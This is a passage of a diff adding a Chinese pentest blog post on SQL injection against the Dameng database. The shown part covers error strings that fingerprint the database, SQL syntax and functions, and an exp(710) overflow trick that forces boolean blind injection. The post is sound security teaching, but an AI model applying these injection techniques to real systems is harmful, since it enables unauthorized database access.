@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>达梦数据库DMSQL-SQL注入小记 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content=" DMSQL注入小记，转手存为笔记，辅助日常工作。麻烦大家也点点原文链接，欢迎大家点赞评论。
+原文首发在：先知社区 https://xz.aliyun.com/t/16721
+达梦数据库DMSQL-SQL注入小记 目前国产化越来越普及，平时遇到的达梦数据库也越来越多，因此决定进行下总结。由于本人能力有限，如果文章中有纰漏欢迎指正，也欢迎大家进行交流。
+"><meta name="keywords" content='SQLi'>
+  <meta itemprop="name" content="达梦数据库DMSQL-SQL注入小记">
+  <meta itemprop="description" content="DMSQL注入小记，转手存为笔记，辅助日常工作。麻烦大家也点点原文链接，欢迎大家点赞评论。
+原文首发在：先知社区 https://xz.aliyun.com/t/16721
+达梦数据库DMSQL-SQL注入小记 目前国产化越来越普及，平时遇到的达梦数据库也越来越多，因此决定进行下总结。由于本人能力有限，如果文章中有纰漏欢迎指正，也欢迎大家进行交流。">
+  <meta itemprop="datePublished" content="2024-12-17T09:30:40+08:00">
+  <meta itemprop="dateModified" content="2024-12-17T09:30:40+08:00">
+  <meta itemprop="wordCount" content="3163">
+  <meta itemprop="keywords" content="SQLi"><meta property="og:url" content="http://localhost:1313/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="达梦数据库DMSQL-SQL注入小记">
+  <meta property="og:description" content="DMSQL注入小记，转手存为笔记，辅助日常工作。麻烦大家也点点原文链接，欢迎大家点赞评论。
+原文首发在：先知社区 https://xz.aliyun.com/t/16721
+达梦数据库DMSQL-SQL注入小记 目前国产化越来越普及，平时遇到的达梦数据库也越来越多，因此决定进行下总结。由于本人能力有限，如果文章中有纰漏欢迎指正，也欢迎大家进行交流。">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-17T09:30:40+08:00">
+    <meta property="article:modified_time" content="2024-12-17T09:30:40+08:00">
+    <meta property="article:tag" content="SQLi">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="达梦数据库DMSQL-SQL注入小记">
+  <meta name="twitter:description" content="DMSQL注入小记，转手存为笔记，辅助日常工作。麻烦大家也点点原文链接，欢迎大家点赞评论。
+原文首发在：先知社区 https://xz.aliyun.com/t/16721
+达梦数据库DMSQL-SQL注入小记 目前国产化越来越普及，平时遇到的达梦数据库也越来越多，因此决定进行下总结。由于本人能力有限，如果文章中有纰漏欢迎指正，也欢迎大家进行交流。">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/" title="达梦数据库DMSQL-SQL注入小记 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/burp-cph-usage/" title="Burp-CPH插件心得" /><link rel="next" type="text/html" href="http://localhost:1313/search/" title="搜索" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/index.md" title="达梦数据库DMSQL-SQL注入小记 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "达梦数据库DMSQL-SQL注入小记",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0\/"
+    },"genre": "posts","keywords": "SQLi","wordcount":  3163 ,
+    "url": "http:\/\/localhost:1313\/posts\/%E8%BE%BE%E6%A2%A6%E6%95%B0%E6%8D%AE%E5%BA%93dmsql-sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0\/","datePublished": "2024-12-17T09:30:40+08:00","dateModified": "2024-12-17T09:30:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>达梦数据库DMSQL-SQL注入小记</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2024-12-17 09:30:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-12-17">2024-12-17</time></span>&nbsp;<span title="3163 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3200 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 7 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-判断dmsql">0x01 判断DMSQL</a></li>
+    <li><a href="#0x02-基础语法">0x02 基础语法</a>
+      <ul>
+        <li><a href="#21-注释">2.1 注释</a></li>
+        <li><a href="#22-常用运算符">2.2 常用运算符</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-函数特性">0x03 函数特性</a>
+      <ul>
+        <li><a href="#31-进制转换">3.1 进制转换</a></li>
+        <li><a href="#32-字符串截取">3.2 字符串截取</a></li>
+        <li><a href="#33-字符串拼接">3.3 字符串拼接</a></li>
+        <li><a href="#34-其他">3.4 其他</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-sqli-获取数据">0x04 SQLi 获取数据</a>
+      <ul>
+        <li><a href="#41-基本信息">4.1 基本信息</a></li>
+        <li><a href="#42-查询全局变量">4.2 查询全局变量</a></li>
+        <li><a href="#43-查询系统表">4.3 查询系统表</a>
+          <ul>
+            <li><a href="#1-查询库名">1） 查询库名</a></li>
+            <li><a href="#2-查询表名">2） 查询表名</a></li>
+            <li><a href="#3-查询列名">3） 查询列名</a></li>
+          </ul>
+        </li>
+        <li><a href="#44-查询视图">4.4 查询视图</a>
+          <ul>
+            <li><a href="#1-查询用户">1） 查询用户</a></li>
+            <li><a href="#2-查询库名">2） 查询库名</a></li>
+            <li><a href="#3-查询表名">3） 查询表名</a></li>
+            <li><a href="#4-查询列名">4） 查询列名</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#0x05-联合查询注入">0x05 联合查询注入</a></li>
+    <li><a href="#0x06-报错注入">0x06 报错注入</a>
+      <ul>
+        <li><a href="#61-除0错误">6.1 除0错误</a></li>
+        <li><a href="#62-溢出错误">6.2 溢出错误</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x07-布尔盲注">0x07 布尔盲注</a></li>
+    <li><a href="#0x08-时间盲注">0x08 时间盲注</a></li>
+    <li><a href="#0x09-dns外带注入">0x09 DNS外带注入</a></li>
+    <li><a href="#0x0a-堆叠注入">0x0A 堆叠注入</a>
+      <ul>
+        <li><a href="#101-结合dns外带">10.1 结合DNS外带</a></li>
+        <li><a href="#102-结合除0报错">10.2 结合除0报错</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x0b-order-by-位置注入">0x0B order by 位置注入</a>
+      <ul>
+        <li><a href="#111-位运算符">11.1 位运算符</a></li>
+        <li><a href="#112-union">11.2 union</a></li>
+        <li><a href="#113-转化成where">11.3 转化成Where</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x0c-limit-注入">0x0C limit 注入</a></li>
+    <li><a href="#end-参考文章">END 参考文章</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><blockquote>
+<p>DMSQL注入小记，转手存为笔记，辅助日常工作。麻烦大家也点点原文链接，欢迎大家点赞评论。</p>
+<p>原文首发在：先知社区 <a href="https://xz.aliyun.com/t/16721"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/16721</a></p>
+</blockquote>
+<h2 id="达梦数据库dmsql-sql注入小记" class="heading-element"><span>达梦数据库DMSQL-SQL注入小记</span>
+  <a href="#%e8%be%be%e6%a2%a6%e6%95%b0%e6%8d%ae%e5%ba%93dmsql-sql%e6%b3%a8%e5%85%a5%e5%b0%8f%e8%ae%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>目前国产化越来越普及，平时遇到的达梦数据库也越来越多，因此决定进行下总结。由于本人能力有限，如果文章中有纰漏欢迎指正，也欢迎大家进行交流。</p>
+<p>官方存在达梦线上实验室，可以在线试用达梦数据库，免注册，省去了自己下载安装的时间。
+<a href="https://eco.dameng.com/tour/"target="_blank" rel="external nofollow noopener noreferrer">https://eco.dameng.com/tour/</a></p>
+<h2 id="0x01-判断dmsql" class="heading-element"><span>0x01 判断DMSQL</span>
+  <a href="#0x01-%e5%88%a4%e6%96%addmsql" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>常见的判断方法如下：</p>
+<p>报错语句：</p>
+<ul>
+<li><code>dm.jabc.driver.DMException</code></li>
+<li>无 updatexml 等方法，</li>
+</ul>
+<h2 id="0x02-基础语法" class="heading-element"><span>0x02 基础语法</span>
+  <a href="#0x02-%e5%9f%ba%e7%a1%80%e8%af%ad%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w">			</span><span class="c1">-- 返回当前用户，默认是SYSDBA
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w">		</span><span class="c1">-- 同上
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">cur_database</span><span class="w">		</span><span class="c1">-- 返回当前库名，默认是DAMENG
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">cur_database</span><span class="p">()</span><span class="w"> 	</span><span class="c1">-- 同上
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w">  </span><span class="mi">1</span><span class="w"> 						</span><span class="c1">-- select语句后面可以不跟表名，存在默认表dual，可以接from dual
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">dual</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">		</span><span class="c1">-- &amp;&amp;可以代替and，但||不能代替or</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="21-注释" class="heading-element"><span>2.1 注释</span>
+  <a href="#21-%e6%b3%a8%e9%87%8a" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">-- 单行注释
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="cm">/*aaa*/</span><span class="k">from</span><span class="w"> </span><span class="n">dual</span><span class="w">  	</span><span class="c1">-- 支持/**/多行注释</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>不支持 <code>#</code> 单行注释 和<code>/*! */</code>内联注释</p>
+<h3 id="22-常用运算符" class="heading-element"><span>2.2 常用运算符</span>
+  <a href="#22-%e5%b8%b8%e7%94%a8%e8%bf%90%e7%ae%97%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://eco.dameng.com/document/dm/zh-cn/pm/dm8_sql-data-types-operators.html#2.9%20%E6%93%8D%E4%BD%9C%E7%AC%A6"target="_blank" rel="external nofollow noopener noreferrer">DMSQL程序数据库类型与操作符</a></p>
+<p>常用运算符差异不大，&amp;&amp; 同 AND，但 || 无法代替 OR。</p>
+<h2 id="0x03-函数特性" class="heading-element"><span>0x03 函数特性</span>
+  <a href="#0x03-%e5%87%bd%e6%95%b0%e7%89%b9%e6%80%a7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">md5</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w">							</span><span class="c1">-- 返回 0xC4CA4238A0B923820DCC509A6F75849B，返回对应MD5值，前面加了0x
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">exp</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="mi">710</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exp</span><span class="p">(</span><span class="mi">710</span><span class="p">)</span><span class="w">				</span><span class="c1">-- 返回整数溢出错误，使用这种方式可以强制BOOL盲注</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="31-进制转换" class="heading-element"><span>3.1 进制转换</span>
+  <a href="#31-%e8%bf%9b%e5%88%b6%e8%bd%ac%e6%8d%a2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">ASCII</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">			</span><span class="err">返回字符串第一个字符的</span><span class="n">ASCII值</span><span class="p">,</span><span class="w"> </span><span class="n">ASCII</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">97</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nb">char</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="w">				</span><span class="err">返回参数</span><span class="n">num对应的ASCII字符</span><span class="err">，</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chr</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="w">				</span><span class="err">同上，</span><span class="n">CHR</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HEX</span><span class="p">(</span><span class="n">str</span><span class="p">)</span><span class="w">				</span><span class="err">返回</span><span class="mi">16</span><span class="err">进制字符串形式</span><span class="p">,</span><span class="w"> </span><span class="n">hex</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3132</span><span class="w">
